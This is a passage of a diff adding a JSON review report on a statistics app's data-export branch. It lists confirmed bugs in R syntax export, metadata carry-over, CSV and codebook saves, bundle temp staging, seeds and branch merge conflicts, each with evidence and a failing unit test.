+     "claim": "The R syntax marked 'verified' diverges from the engine once group codes are text that R's read.csv converts, or when a variable name gets formula protection in the CSV header. With leading-zero text groups ('01'/'02'), which the importer deliberately keeps as text, the Welch script stops with an error. Distinct text labels such as '1' and '01' are merged by R, so the ANOVA script exits 0 with a different F, df and p. A variable named '-y' is looked up by its unprotected name, which is not in the CSV header, so the script fails.",
+     "evidence": "Fixture check: the 180×98 fixture was reproduced in memory, the six SYNTAX_ANALYSES were run with the branch engine, and the r_syntax scripts ran in Rscript 4.3.3 on write_csv output. Result: 29/29 check values within 1e-9 (max relative difference 1.28e-13), so the documented claim holds for the fixture.\nAdversarial 60-row frame:\n- Welch on cond='01'/'02': the script line is g <- factor(unprotect(d[[\"cond\"]]), levels = c(\"01\", \"02\")) and R exits 1 ('Execution halted'). read.csv (export_bundle.py:355, no colClasses) turns the quoted \"01\"/\"02\" into integers 1/2, so every g is NA.\n- ANOVA on arm='1'/'01'/'2': the engine keeps 3 groups (omnibus_analysis.py: 'Do not silently merge different category values such as 1 and \"1\"') and gives F=3.0904, df1=2, df2=57, p=0.0532. R prints F=0.3406, df1=1, df2=58, p=0.5617 with exit 0.\n- Pearson x vs '-y': the CSV header cell is '\\'-y', so y <- d[[\"-y\"]] is NULL and R exits 1.\nProtected group labels ('-', '+', '=a', '@b', '-c') do work: unprotect restores them and both tests match to 1e-9.",
+     "confirmed": true,
+     "file_line": "export_bundle.py:347-360 (R_HEADER read.csv), 363-374 (_levels_literal), 389, 427-441",
+     "red_test": "@unittest.skipUnless(shutil.which('Rscript'), 'R is not installed here')\ndef test_r_syntax_reproduces_text_coded_groups(self):\n    rng = np.random.default_rng(7)\n    df = pd.DataFrame({'cond': ['01', '02'] * 30, 'arm': ['1', '01', '2'] * 20,\n                       'score': rng.normal(50, 10, 60).round(3)})\n    s = ResearchSession(); s.set_dataset(df, 'codes.csv')\n    for c in ('cond', 'arm'): s.confirm_level(c, 'nominal')\n    s.confirm_level('score', 'scale')\n    c = {'independent': True, 'assumptions': True}\n    for key, roles, opts in (('groups', {'outcome': 'score', 'group': 'cond'}, {'method': 'welch'}),\n                             ('omnibus', {'outcome': 'score', 'group': 'arm'}, {'method': 'anova'})):\n        s.add_result(run_method(key, s, roles, opts, c), method=key, roles=roles, options=opts, confirms=c)\n    path = self.folder / 'codes.zip'\n    eb.write_bundle(path, df=s.df, codebook=codebook_of(s), entries=s.results, app={'version': 't'})\n    # unpack and run each syntax/R*.R as test_the_r_syntax_reproduces_the_engine does:\n    # fails today: R1 exits 1, and R2 prints F=0.3406 against the engine's 3.0904"
+    },
+    {
+     "id": "F3",
+     "severity": "major",
+     "area": "M2 metadata semantics",
+     "claim": "Labels, value labels and user-missing codes carry over, by column name, to any later table with the same column list: a different .sav whose variable documents nothing, or an unrelated CSV. A new file's own metadata is merged instead of replacing the old. The inherited set is then saved for the new project dataset and exported: the .sav declares the stale codes missing, and the codebook counts valid values as user-missing. There is no UI to see or clear missing codes.",
+     "evidence": "In-memory ResearchSession:\n- set_dataset(waveA, report.metadata={'temp': {'label': 'Wave A: -9 = refused', 'missing_codes': ['-9']}, 'q1': …}).\n- Then set_dataset(waveB.sav), whose metadata documents only q1 (temp has no label, no codes and an unknown measure, as pyreadstat or haven write it). temp keeps label 'Wave A: -9 = refused', missing_codes ('-9',) and metadata_source 'sav'.\n- build_codebook(waveB): temp n_user_missing = 2 of 3, valid range '-8.5 – -8.5'.\n- plan_sav declares [-9.0] for temp, although -9 is a valid value in wave B.\n- After set_dataset('unrelated.csv', report=None) with the same columns, temp still has ('-9',) and q1 still has 'Wave B item'.\nCause: set_dataset keeps the dictionary when the column list is equal (workspace_state.py:279); build_dictionary copies the metadata by name and storage (:123); the new file's metadata is applied without replace_all (:283). With a project open, _save_dataset then persists it for the new dataset (project_session.py:606-607). docs §3.1 promises 'documented metadata only, never inferred', and there is no editor.",
+     "confirmed": true,
+     "file_line": "workspace_state.py:108-127 (build_dictionary), 271-290 (set_dataset, 279/283); project_session.py:606-607",
+     "red_test": "def test_a_new_file_does_not_inherit_another_files_missing_codes(self):\n    s = ResearchSession()\n    s.set_dataset(pd.DataFrame({'q1': [1.0, 2.0, -9.0], 'temp': [-9.0, 3.0, 4.0]}), 'waveA.sav',\n                  report=SimpleNamespace(metadata={'temp': {'label': 'A', 'missing_codes': ['-9'], 'source': 'sav'}}))\n    s.set_dataset(pd.DataFrame({'q1': [1.0, 2.0, 2.0], 'temp': [-9.0, -8.5, -9.0]}), 'waveB.sav',\n                  report=SimpleNamespace(metadata={'q1': {'label': 'B', 'source': 'sav'}}))\n    self.assertEqual(s.variables['temp'].missing_codes, ())   # fails: ('-9',)\n    self.assertEqual(s.variables['temp'].label, '')           # fails: 'A'"
+    },
+    {
+     "id": "F4",
+     "severity": "minor",
+     "area": "atomic save / long paths (CSV + codebook)",
+     "claim": "A CSV export is two separate atomic saves. When the codebook step fails after the CSV has been moved into place, the researcher is told the save failed, possibly that the name 'cannot be used as a file name', even though the CSV was replaced and the old CSV is gone. The codebook is then missing or stale, so the importer no longer vouches for the file. Triggers: a long or Unicode name where the CSV's temp name fits but the codebook's does not, disk full, or a read-only old codebook.",
+     "evidence": "export_csv moves the CSV into place (data_export.py:1476) before the codebook's own save_atomic runs (:1508). With the branch's _temporary and a 225-character stem:\n- CSV: 229 B.\n- CSV temp: 247 B (os.stat gives ENOENT, so the name is accepted).\n- Codebook: 239 B.\n- Codebook temp: 257 B (os.stat gives ENAMETOOLONG).\nexplain() maps ENAMETOOLONG to save.bad_name ('“x.csv” cannot be used as a file name') although x.csv has just been overwritten. On Windows without long-path support, the same window is a full CSV path of 232–241 characters (CSV temp L+18 ≤ 259 < codebook temp L+28), plausible in deep OneDrive folders. Every check used os.stat only; nothing was created.",
+     "confirmed": true,
+     "file_line": "data_export.py:1402-1404 (_temporary), 1476-1480, 1508; workspace_files.py explain (ENAMETOOLONG → save.bad_name)",
+     "red_test": "def test_a_failed_codebook_leaves_the_previous_csv(self):\n    with tempfile.TemporaryDirectory() as folder:\n        path = Path(folder) / ('a' * 225 + '.csv')\n        path.write_text('old', encoding='utf-8')\n        df = pd.DataFrame({'x': [1.0]})\n        with self.assertRaises(OSError):\n            de.export_csv(path, df, de.build_codebook(df, 'x'))\n        self.assertEqual(path.read_text(encoding='utf-8'), 'old')   # fails: the CSV was already replaced"
+    },
+    {
+     "id": "F5",
+     "severity": "minor",
+     "area": "bundle reproducibility",
+     "claim": "In the bundle, the vouching codebook sits at codebook/codebook.json, not at data/<stem>_codebook.json where the program's importer looks. Opening the bundle's CSV in the program therefore keeps every protective apostrophe, and the dataset no longer matches manifest.dataset.sha256.",
+     "evidence": "In memory: fixture plus a formula-like text column; the bundle CSV has 144 protected cells. Manifest dataset sha256 is 1f4023a708623578…. Opening the CSV as it is unzipped, csv_safety.exported_codebook finds no sidecar (codebook_path gives data/synthetic_master_research_n180_codebook.json). formula_text comes back as ['\\'=1+1', '\\'+x', '\\'-2+3'] and session.dataset_sha256() = ac07723cece9218b… ≠ manifest. The same CSV bytes with the codebook placed as data/<stem>_codebook.json give 1f4023a708623578… (match).",
+     "confirmed": true,
+     "file_line": "export_bundle.py:526-552 (members data/<csv>, codebook/codebook.json); csv_safety.py codebook_path / exported_codebook",
+     "red_test": "def test_the_bundle_csv_reopens_as_the_analysed_table(self):\n    # session with the adversarial 'formula_text' column; write_bundle; extractall\n    frame, report = load_dataset_with_report(unpacked / 'data' / 'synthetic_master_research_n180.csv')\n    s = ResearchSession(); s.set_dataset(frame, 'x', report=report)\n    self.assertEqual(s.dataset_sha256(), manifest['dataset']['sha256'])   # fails: ac07… vs 1f40…"
+    },
+    {
+     "id": "F6",
+     "severity": "minor",
+     "area": "file safety / privacy (bundle)",
+     "claim": "The bundle writes row-level copies of the data (CSV, .xlsx, .sav, results.xlsx and the Word report) into the system temp folder before zipping them. That contradicts the card's 'Nothing is uploaded: the file is written only where you choose' and docs §5.3/§5.4 (temp file in the chosen folder; exports write only to the chosen folder). A crash, kill or failed cleanup on Windows leaves participant data in %TEMP%.",
+     "evidence": "export_bundle.py:526 calls tempfile.TemporaryDirectory(prefix=\"sra-bundle-\") with no dir=, and :528-562 write each member there. Stub run, with TemporaryDirectory replaced by a recorder that aborts so nothing is written: the destination was '/home/researcher/Chosen Folder/study_bundle.zip', while TemporaryDirectory was called with {'prefix': 'sra-bundle-'}, i.e. tempfile.gettempdir() (%TEMP% on Windows).",
+     "confirmed": true,
+     "file_line": "export_bundle.py:526-562; workspace_text.py export.not_uploaded; docs/STAGE37_EXPORT.md §5.3-5.4",
+     "red_test": "def test_the_bundle_stages_nothing_outside_the_chosen_folder(self):\n    df = pd.DataFrame({'participant_code': ['P1', 'P2'], 'score': [1.0, 2.0]})\n    with mock.patch.object(eb.tempfile, 'TemporaryDirectory',\n                           side_effect=AssertionError('staged outside the chosen folder')):\n        eb.write_bundle(self.folder / 'b.zip', df=df, codebook=de.build_codebook(df, 'b'), entries=[])   # fails today"
+    },
+    {
+     "id": "F7",
+     "severity": "minor",
+     "area": "identifying-column warning",
+     "claim": "The participant warning misses common survey headers. Name questions with trailing punctuation ('What is your name?', 'Vārds, uzvārds:', 'Ваше имя?') never match the name rule. They are flagged only incidentally, as a 'participant code', while every name is unique and the level is unconfirmed, and the flag disappears once the researcher confirms the column as nominal (or as soon as two names repeat). Respondent-number columns ('Nr.', '№', 'Respondenta numurs') are never flagged.",
+     "evidence": "sensitive_columns with session levels:\n- n=10: 'Name' is flagged; 'What is your name?', 'Vārds, uzvārds:', 'Ваше имя?', 'Participant' (P000…) and 'Nr.' are not.\n- n=60 unique names: the three question headers come back only as ('identifier', 'participant code'), and after confirm_level('What is your name?', 'nominal') it drops off the list.\n- 'Nr.', '№' and 'Respondenta numurs' are never flagged.\nCause: _name_tokens splits only on whitespace, '-', '.', '/' and '_' (data_export.py:1557), so 'name?', 'uzvārds:' and 'имя?' never equal a listed token. looks_like_identifier knows only 'id', '*_id' and four English names.",
+     "confirmed": true,
+     "file_line": "data_export.py:1555-1559 (_name_tokens), 1562-1604 (sensitive_columns); variable_rules.py:7-12",
+     "red_test": "def test_question_style_name_headers_and_respondent_numbers_are_flagged(self):\n    names = ['Anna Ozola', 'Jānis Bērziņš', 'Anna Ozola']\n    frame = pd.DataFrame({'What is your name?': names, 'Vārds, uzvārds:': names,\n                          'Ваше имя?': names, 'Nr.': [1, 2, 3]})\n    found = {c.name for c in de.sensitive_columns(frame)}\n    self.assertEqual(found, set(frame.columns))   # fails: set()"
+    },
+    {
+     "id": "F8",
+     "severity": "minor",
+     "area": "seeds in manifest/provenance",
+     "claim": "Seeds are not fully recorded. An omega analysis with a bootstrap CI records seeds {} in the manifest and the Provenance sheet: the bootstrap seed and resample count live only in the CI object, which the run does not keep, and the ML start seed 3427 is recorded nowhere. docs §2.5 says the bundle records seeds fixed inside engine functions, but ENGINE_SEEDS lists only Spearman and parallel analysis.",
+     "evidence": "In memory, omega on SYN_WELL_01..05 with ci='200': run.result is an OmegaResult (analysis_runs.py:225; the OmegaBootstrapCI carrying seed=20261103 is dropped), and eb.seeds_of(entry) == {}. The seed appears only in the report text ('… 200/200 valid case-resampling refits; seed 20261103'). omega_analysis.ML_START_SEED = 3427 is fixed in the engine and not stored.",
+     "confirmed": true,
+     "file_line": "analysis_runs.py:192-228 (run_omega); export_bundle.py:50-58 (ENGINE_SEEDS), 201-224 (seeds_of)",
+     "red_test": "def test_omega_bootstrap_seed_reaches_the_manifest(self):\n    items = [f'SYN_WELL_0{i}' for i in range(1, 6)]\n    for c in items: self.session.confirm_level(c, 'ordinal')\n    run = run_method('omega', self.session, {'items': items}, {'ci': '200'}, {'construct': True})\n    self.session.add_result(run, method='omega', roles={'items': items}, options={'ci': '200'}, confirms={'construct': True})\n    self.assertEqual(eb.seeds_of(self.session.results[-1]).get('seed'), 20261103)   # fails: {}"
+    },
+    {
+     "id": "F9",
+     "severity": "minor",
+     "area": "preferences / cross-project state",
+     "claim": "After a project switch, the Data page's Export card still shows the previous project's outcome, e.g. 'Saved and checked: <project A path> … 180 rows', because only the analyze, results and reports pages are reset.",
+     "evidence": "workspace_projects.py:263-269: _reset_pages loops over ('analyze', 'results', 'reports') only. ResultsPage.reset and ReportsPage.reset clear self.export.feedback (workspace_analyze.py:1151, 1670). DataPage (workspace_shell.py:988, ExportPanel at :1003) has no reset, and pages are built once (workspace_shell.py:181-182), so pages['data'].export.feedback survives the switch.",
+     "confirmed": true,
+     "file_line": "workspace_projects.py:263-269; workspace_shell.py:181-182, 988-1003; workspace_analyze.py:1151, 1670",
+     "red_test": "def test_switching_projects_clears_the_data_export_outcome(self):\n    ws = Workspace(root=self.root)\n    ws.app.projects.create('Fictional A'); open the master fixture; fake save_dialog; ws.click('export-save-data')\n    self.assertTrue(texts(ws, 'export-feedback-data'))\n    ws.app.projects.create('Fictional B'); ws.click('nav-data')\n    self.assertEqual(texts(ws, 'export-feedback-data'), [])   # fails: project A's 'Saved and checked …' is still shown"
+    },
+    {
+     "id": "F10",
+     "severity": "minor",
+     "area": "CSV round trip through the program",
+     "claim": "The program does not read its own CSV back exactly, even when the codebook vouches for it. Texts 'NA', 'N/A', 'NULL' (e.g. from a .sav string variable) and blank-only texts become missing; booleans come back as the text 'True'/'False'. This contradicts test_the_program_reads_its_own_csv_back_exactly and the doc's 'every protected text restored'.",
+     "evidence": "In memory: write_csv, then load_dataset_with_report with a codebook whose SHA-256 matches (exported_codebook patched to return it), both layouts. answer 'NA', 'N/A', 'null' and '  ' became None; the warning says '3 text marker(s)', so the blank-only one is silent. flag (bool) came back as 'True'/'False' text. A numeric column holding one inf came back entirely as text ('1.5', '2', '-0.0'; '1,5' in the semicolon layout), though infinities are rare in session data. Cause: DEFAULT_MISSING is applied to every text cell even for a vouched file, whose only missing marker is an unquoted empty field (data_loader.py:34, 498); _numeric_value (:335) has no inf; nothing converts True/False back.",
+     "confirmed": true,
+     "file_line": "data_loader.py:34, 335, 383, 498-512; data_export.py:150-159, 983",
+     "red_test": "def test_own_csv_round_trip_keeps_na_texts_and_booleans(self):\n    df = pd.DataFrame({'answer': ['NA', 'N/A', 'ok'], 'flag': [True, False, True]})\n    path = self.folder / 'na.csv'\n    de.export_csv(path, df, de.build_codebook(df, 'na'))\n    frame, _ = load_dataset_with_report(path)\n    self.assertEqual(frame['answer'].tolist(), ['NA', 'N/A', 'ok'])   # fails: [None, None, 'ok']\n    self.assertEqual(frame['flag'].tolist(), [True, False, True])     # fails: ['True', 'False', 'True']"
+    },
+    {
+     "id": "F11",
+     "severity": "minor",
+     "area": ".sav preview completeness",
+     "claim": "plan_sav claims to list every converted field before saving, but text values that change in the .sav are not listed: trailing spaces are stripped, and a blank-only text becomes the declared-missing blank.",
+     "evidence": "In memory: answer=['trailing  ', '   ', 'x'*40000, None, 'ok'] gives plan_sav(...).changes == []. After write_sav and read_sav: 'trailing  ' comes back as 'trailing', '   ' as '' declared missing ({'lo': '', 'hi': ''}), and None as ''. The 40,000-byte string is kept. This is SPSS's own string padding, but the preview promises to list it.",
+     "confirmed": true,
+     "file_line": "data_export.py:795-866 (plan_sav), 868-891 (_sav_values)",
+     "red_test": "def test_sav_preview_lists_text_values_that_change(self):\n    df = pd.DataFrame({'answer': ['trailing  ', '   ', None, 'ok']})\n    self.assertTrue(de.plan_sav(df, de.build_codebook(df, 'p')).changes)   # fails: []"
+    }
+   ],
+   "checked_and_fine": [
+    "Method: no worktree or scratch folder was created (read-only mode), so nothing needed removing. All checks ran in memory against git objects of claude/stage37-export @ 619143d38eae8d8e30448df665e2545a915496ab (a meta-path importer for the branch modules, memfd for library file I/O, python -I -B). Nothing was written to the repo or the filesystem; Rscript used only its own transient session tempdir. The full suite was not run because it writes temporary files.",
+    "R syntax on the synthetic master fixture: 29/29 check values (Pearson 5, regression 13, Welch 3, ANOVA 4, Welch ANOVA 4) agree with the engine within 1e-9 (max relative difference 1.28e-13). Spearman gets no syntax, with the reason 'no verified syntax for this method in this version'. Missing result objects, names that cannot be written in an R formula, and HC3 regression also return stated reasons. The R unprotect regex correctly restores protected group labels (- + =a @b -c).",
+    "save_atomic: the temp file '.<stem>.<hex8>.partial<ext>' is created in the destination folder; then come verify, fsync, os.replace and a post-move size + SHA-256 check. Any exception unlinks the temp file. A Windows os.replace PermissionError (target held by Excel) removes the temp file, leaves the old file intact and maps to save.file_locked ('open in another program or read-only…'). A read-only folder without the target maps to save.folder_read_only. Every verifier closes its handle before os.replace (openpyxl read-only book.close in finally; pyreadstat; with-blocks). Gap: no test covers PermissionError at os.replace; only a missing folder and produce/verify failures are tested.",
+    "Unicode paths: pyreadstat 1.3.7 opens Windows paths with _wsopen(PyUnicode_AsWideCharString) for both read and write (_readstat_writer.pyx:593-597, _readstat_parser.pyx:857-859). The other writers use Python's wide-character APIs.",
+    ".sav checked with my own system-file parser: header $FL2, layout 2, uncompressed, ncases correct. Type-2 records, with short-string missing values in type 2 and long-string missing values in subtype 22. Long-string value labels in subtype 21, numeric value labels in type 3/4. Measures in subtype 11 match the confirmed levels (1,1,2,2,3). Long names in subtype 13, UTF-8 in subtype 20, notes in type 6 including 'Renamed: a_b = a b'. Formats F8.0/F8.2/An. Values are exact (1e300, -0.0, 0.1+0.2), and a 40,000-byte string is preserved.",
+    "CSV formula guard (D8): protect and restore are inverse operations. Numbers are written unquoted and never changed. The importer restores only when the codebook or log matches format, rule and SHA-256. The questionnaire codebook keeps the format marker (survey_codebook has no 'format' key). The prepared-data log is <stem>_steps.json with PREPARATION_FORMAT. The bundle's CSV member records the correct sha256 in codebook.json.",
+    "Bundle integrity: verify_zip runs testzip and checks the SHA-256 of every manifest-listed member, plus the CSV row count. The dataset SHA-256 and each analysis's dataset SHA-256 are recorded. Member order is deterministic; timestamps are wall-clock and no determinism is claimed. Member names are sanitised (_safe_stem, report_docx.default_file_name), so no path traversal. The app has no bundle import path, and verify_zip reads members by name without extracting, so zip-slip does not apply.",
+    "M2 storage: nothing in the base code ever wrote variables.label or datasets.notes. The save is refused when notes hold other text (tested). Labels are reset and upserted. Metadata is restored with replace_all when a project dataset opens, with no write on open (_restoring, notify=False), and is saved with every new dataset version. SCHEMA_VERSION 6 and migrate() are unchanged; the format-5 builds (claude/stage368-rc, claude/stage36-acceptance) still refuse newer formats. 37.0a's save_levels upsert preserves the label column.",
+    "Preferences: export choices live in the per-user file ~/.statistical_research_assistant/preferences.json under 'export' (formats per page, CSV layout, BOM), and are validated on read. save_preferences now keeps keys it does not manage. The Results and Reports export feedback is reset on a project switch, and the codebook cache key includes dataset_id.",
+    "The identifying-column warning does fire for 'Name', an e-mail column detected by its values, 'Respondent ID', free text such as 'Comments (optional)', and the fixture's participant_code.",
+    "The Windows journey's check_export compares every cell for .xlsx, .sav and .csv against the fixture, and checks that the codebook vouches for the CSV by SHA-256."
+   ]
+  },
+  "integration": {
+   "findings": [
+    {
+     "id": "F1",
+     "severity": "major",
+     "area": "Integration: Windows journey registry and the count/position tests",
+     "claim": "Three branches all claim the 19th journey slot: claude/stage37-export (export-data), claude/stage37-0b (stage37-hypothesis) and claude/stage37-rag (research-library). Merging any two of them gives textual conflicts in three files, and every count/position test then fails. Each branch pins len(e2e.JOURNEYS) == 19 and list(e2e.JOURNEYS)[18:] == [its own journey], so even a perfect hand resolution goes red.",
+     "evidence": "Merge base for all three is 2f9af71. Measured with `git diff -U0`, exact base line ranges:\n(a) tests/test_stage368_review_journeys.py: all three replace base lines 74-75 with different text (export adds a 2-line comment between the asserts, 0b adds it before them, rag uses an inline comment).\n(b) tools/windows_gui_e2e.py: all three insert after base line 64 (docstring journey list), after base line 3856 (their journey function after journey_report_composition), and after base line 3895 (the JOURNEYS entry after \"report-composition\").\n(c) workspace_text.py: all three insert after base line 3302 (tail of the last T.update block).\nAn in-memory overlap check reports 1 + 3 + 1 conflicting hunk pairs for export+0b and the same for export+rag.\nTests that pin the count or position:\n- export: tests/test_stage368_review_journeys.py:77 `assertEqual(len(e2e.JOURNEYS), 19)`; tests/test_stage37_export_journey.py:52 `[18:] == [\"export-data\"]`\n- 0b: tests/test_stage368_review_journeys.py:77 `len == 19`; tests/test_stage37_journey.py:60 `len == 19` and :62 `[18:] == [\"stage37-hypothesis\"]`\n- rag: tests/test_stage368_review_journeys.py:75 `len == 19`; tests/test_stage37_library_journey.py:41-42 `len == 19`, `[18:] == [\"research-library\"]`\nThe set is wider than asked. JOURNEYS keys parsed from each branch: claude/stage37-ux-shell adds 2 at index 18 (startup-workspace, settings-language) and claude/stage37-ux-vars adds 1 (variable-picker). Those two use a merge-tolerant `assertGreaterEqual(len(e2e.JOURNEYS), 18)` but also edit lines 74-75 (textual conflict). With all five branches len = 23. Even 18+2 = 20 breaks every `== 19`, and at most one `[18:] == [X]` can hold.",
+     "file_line": "tests/test_stage368_review_journeys.py:74-77; tests/test_stage37_export_journey.py:52; tools/windows_gui_e2e.py:61-69,3856-4027,4068-4070; workspace_text.py:3302",
+     "red_test": "Trial merge of claude/stage37-export with claude/stage37-0b (or claude/stage37-rag) in a scratch clone: git reports CONFLICT (content) in tests/test_stage368_review_journeys.py, tools/windows_gui_e2e.py and workspace_text.py. Resolve by keeping both journeys, then run `python -m unittest tests.test_stage368_review_journeys.JourneyOrderTests tests.test_stage37_export_journey.JourneyOrderTests tests.test_stage37_journey`. It fails with `AssertionError: 20 != 19` and `['export-data', 'stage37-hypothesis'] != ['export-data']`. Fix, as the UX branches already do: assert `list(JOURNEYS)[:18] == THE_EIGHTEEN`, `\"export-data\" in list(JOURNEYS)[18:]` and `len(JOURNEYS) >= 19`.",
+     "confirmed": true
+    },
+    {
+     "id": "F2",
+     "severity": "minor",
+     "area": "Export card render cost on the Data page (remembered .sav)",
+     "claim": "ExportPanel.build() runs on every Data-page render. With .sav chosen it recomputes plan_sav every time (not cached). After any variable change it also rebuilds the whole codebook, including a SHA-256 of the table as CSV text. All of this runs synchronously inside render(). The format is remembered, so a researcher who exports .sav once pays this on every later render, across restarts. Row-level formats, including the .xlsx default, also re-run sensitive_columns on every render.",
+     "evidence": "Code path:\n- workspace_shell.py:1045 calls `self.export.build()` inside DataPage.build.\n- workspace_export.py:190-191 calls _sav_notices whenever fmt == 'sav'.\n- workspace_export.py:207-208 runs `book = self.codebook(); plan = de.plan_sav(...)` with no cache.\n- workspace_export.py:154-161: the codebook cache key includes s.variables, so Accept suggestions or a level change is a miss.\n- workspace_export.py:194-195 runs sensitive_columns for every row-level format.\nMeasured in memory with the real ExportPanel and ResearchSession, a stub app and synthetic data (extra time per render):\n- 20,000×150: first +5.08 s, unchanged re-render +0.61 s, after a level change +1.84 s\n- 100,000×30 (the shape of the doc's §7 table): first +5.70 s, later +0.32 s\n- 5,000×300: first +1.55 s, later +0.31 s, after Accept suggestions +0.99 s\n- 10,000×100: +0.73 / +0.14 / +0.29 s\n- 100,000×300: plan_sav alone 1.94 s per render; build_codebook 12.8 s\n- .xlsx default: +0.02 to 0.33 s (sensitive_columns 0.33 s at 100k×300)\n- small survey 2,000×120: at most 0.18 s.\nNot hit while typing: a single level confirmation re-renders only the chrome, and the import fields only store values.",
+     "file_line": "workspace_export.py:154-161,190-195,203-219; workspace_shell.py:1045",
+     "red_test": "In memory: ResearchSession.set_dataset with a 20,000×150 synthetic table; ExportPanel(app, 'data') with _chosen = 'sav'; call build() twice with nothing changed. Assert the second call takes < 0.1 s; it fails at 0.61 s. Fix: cache the SavPlan under the codebook key, and build the codebook and plan off the render path with a short placeholder.",
+     "confirmed": true
+    },
+    {
+     "id": "F3",
+     "severity": "minor",
+     "area": "Export card state across projects (Data page)",
+     "claim": "The Data page's Export card keeps its outcome message after another project is created, opened or closed. The message (e.g. 'Saved and checked: …study_A.xlsx… 180 rows') names the previous project's file next to the new project's data. The Results and Reports cards clear theirs on a switch; the Data card does not.",
+     "evidence": "- workspace_projects.py:263-269: _reset_pages() resets only (\"analyze\", \"results\", \"reports\"); it is called on create (284), open (294) and close (307).\n- DataPage has no reset().\n- workspace_shell.py:181-186: pages are built once in WorkspaceApp.__init__.\n- workspace_export.py:108: the only place the Data card's feedback is cleared is a format change.\n- workspace_analyze.py:1148-1151 and 1664-1670: Results and Reports clear export.feedback, with the comment 'Another project: nothing said about its results' exports'.\nIn-memory demo: set the card's feedback for study_A (180×2), then session.clear() + set_dataset(50×1, 'study_B.csv'). build() still renders 'Saved and checked: C:\\…\\study_A.xlsx. Re-opened with an independent reader: 180 rows, 2 variables (xlsx (zip)).'",
+     "file_line": "workspace_projects.py:263-269; workspace_export.py:108; workspace_analyze.py:1148-1151,1664-1670; workspace_shell.py:181-186",
+     "red_test": "Harness test in the style of tests/test_stage37_export_ui.py: open the master in project A and click export-save-data; create project B with create_project_in_ui and open another CSV; click nav-data; assert `ws.find('export-feedback-data')` is None (or does not name project A's file). It fails today.",
+     "confirmed": true
+    },
+    {
+     "id": "F4",
+     "severity": "minor",
+     "area": "CI path triggers (windows-gui-e2e.yml)",
+     "claim": "The widened path filter covers data_export.py, export_bundle.py, csv_safety.py, data_loader.py and the generator. It misses app_preferences.py and import_workflow.py. Both are changed by this branch and both sit on the export-data journey's path. A later PR touching only these files will skip the Windows GUI journeys. This PR still triggers them because requirements.txt changed.",
+     "evidence": "- Only windows-gui-e2e.yml was widened (lines 38-43).\n- Emulating GitHub's glob matching (* does not cross /) against the branch's changed root modules leaves unmatched: ['app_preferences.py', 'data_preparation.py', 'import_workflow.py'].\n- tools/windows_gui_e2e.py:4024-4027 asserts the value that app_preferences.remember_export writes (preferences.json export.formats.data == 'csv'). This branch also changed save_preferences (_other_keys) so that value survives.\n- The Data page's Open goes through import_workflow.import_picked_files (workspace_shell.py:303), and this branch changed SUPPORTED_EXTENSIONS there.\n- python-tests.yml has no filter, so only the Linux harness runs on such PRs.",
+     "file_line": ".github/workflows/windows-gui-e2e.yml:38-43; tools/windows_gui_e2e.py:4024-4027; workspace_shell.py:303",
+     "red_test": "Add a check that every repo module the export-data journey drives (workspace_export → app_preferences; workspace_shell → import_workflow) matches a windows-gui-e2e.yml paths pattern. It fails today, listing app_preferences.py and import_workflow.py.",
+     "confirmed": true
+    },
+    {
+     "id": "F5",
+     "severity": "minor",
+     "area": "Docs vs code (build-lock doc edited by this branch)",
+     "claim": "docs/STAGE368_BUILD_LOCK.md:195 still says every build's SBOM has '228 components: 49 Python packages'. With pyreadstat the SBOM has 229 top-level components (50 Python), and build_sbom.main() prints 230 because ReadStat is nested. The new §5 note says the cleanup removes 'only' the .c, .pyx and .pxd sources; it also removes conditional_includes.h and py.typed (harmless).",
+     "evidence": "In-memory build_sbom.sbom(None):\n- base 2f9af71: 49 Python, 90 top-level; +138 Dart = 228\n- tip 619143d: 50 Python, 91 top-level; +138 Dart = 229; all_components gives 230\nThe locked Windows wheel, run through the build's own prune globs, loses files with extensions ['c', 'h', 'pxd', 'pyx', 'typed'].",
+     "file_line": "docs/STAGE368_BUILD_LOCK.md:195 and the Stage 37 note in §5",
+     "red_test": "`grep -n '228 components: 49 Python' docs/STAGE368_BUILD_LOCK.md` matches today, while `python -c \"import sys; sys.path.insert(0,'tools'); import build_sbom as s; print(len(s.python_components(s.toolchain.load_lock())))\"` prints 50.",
+     "confirmed": true
+    }
+   ],
+   "checked_and_fine": [
+    "Method: I did not create /tmp/verify-export-integration. My operating constraints forbid creating files or changing state, so I reviewed read-only instead: the existing clean checkout of 619143d (.claude/worktrees/agent-ab4c1a5c434f3d69a, git status clean) and the existing base checkout at 2f9af71 (scratchpad/review37/repo), with every execution in memory and PYTHONDONTWRITEBYTECODE=1. The full suite, the round-trip/UI/journey harness tests and the R test were not run because they write temp files. Nothing needed cleanup.",
+    "Lock: exactly one new pin, pyreadstat==1.3.7, with all 26 hashes of its PyPI files (26/26 match, 0 extra). The cp312 win_amd64 hash 7b65bd28…4609 is present. Upload date 2026-10-21T16:02Z is before --exclude-newer 2026-11-09T19:00Z, and 1.3.7 is the newest release. parse_lock goes from 49 to 50 pins with 0 changed or removed (version, marker or hash). The only other diff lines are the '#   pyreadstat' via-lines under narwhals and numpy, plus pyreadstat's own '# via -r requirements.in'. Its Requires-Dist (narwhals>=2.10.1, numpy) is met by the pinned narwhals 2.28.0 and numpy 2.5.4.",
+    "requirements-dev.txt is byte-identical (same blob 70db706). It is compiled from requirements-dev.in with -c requirements.txt, and pyreadstat is not in the dev resolution.",
+    "tests/test_stage37_dependency.py passes 4/4 on the tip.",
+    "Strict identity on a simulated bundle (in memory): 50 Windows-marker pins including pyreadstat 1.3.7. A bundle identical to the lock gives 0 missing, extra or mismatched; one without pyreadstat reports missing ['pyreadstat']. The real Windows wheel's METADATA, read with the tool's own _metadata_fields and canonical, gives {'pyreadstat': '1.3.7'}, equal to the lock. flet build reads requirements.txt (pyproject.toml has no [project].dependencies). The pinned-windows-toolchain action installs both locks with --require-hashes, as the doc says.",
+    "SBOM: pyreadstat is listed as Apache-2.0 (its License metadata) with ReadStat MIT nested under it (bom-ref …#ReadStat), and both rows appear in licences.md. The copyleft list is unchanged. The wheel's dist-info/licenses/LICENSE holds both the ReadStat MIT text (Evan Miller) and the Apache text, and the cleanup keeps it.",
+    "Windows wheel, streamed into memory (its SHA-256 matches the lock): after the build's prune globs there are 12 files, 2.48 MiB installed, 1.62 MiB deflated, 2.85 MiB removed. These are exactly the doc's §6 numbers, and the .pyd names match the test. The PE imports of both .pyd modules are only python312.dll, KERNEL32, VCRUNTIME140 and UCRT api-ms-win-crt-* (zlib and iconv are linked statically), so nothing is missing from the embedded runtime.",
